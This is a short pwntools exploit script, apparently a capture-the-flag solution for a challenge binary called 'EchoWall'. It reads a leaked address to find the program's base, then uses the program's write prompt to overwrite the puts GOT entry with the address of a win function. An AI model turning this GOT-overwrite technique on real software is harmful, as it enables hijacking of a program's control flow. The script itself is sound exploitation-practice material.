from pwn import * 

binary = ("./EchoWall")
# got to have the same binary as the challenge server (I mean ofc )
# but it's for elf to work, because this would be the binary that elf would be analysing 

#p = process(binary) 
p = remote("chal.firebird.sh", 35028)
elf = ELF(binary) 

context.log_level = 'debug'



p.recvuntil(b'0x') 
leak_addr = int(b'0x' + p.recvuntil(b'|', drop = True), 16)
elf.address = leak_addr - elf.sym['print_wall'] # setting base address of the program 
# from now on elf.sym[] presents the actual acddress but no just offset 



p.sendlineafter("Do you want to read some messages written by others? (1: Yes, 2:No)\n> ", b'2')

p.sendlineafter("Would you like to leave a message on the Echo Wall UwU? (1: Yes, 2:Yes)\n> ", b'2')

p.sendafter("Where do you want to write? ヽ( ^ω^ ゞ )\n> ", p64(elf.got['puts']))
p.sendafter("Cool! (*´ω`)人(´ω`*) Then... What do you want to write? (ゝ∀･)\n> ", p64(elf.sym['UwU_win']))


p.interactive()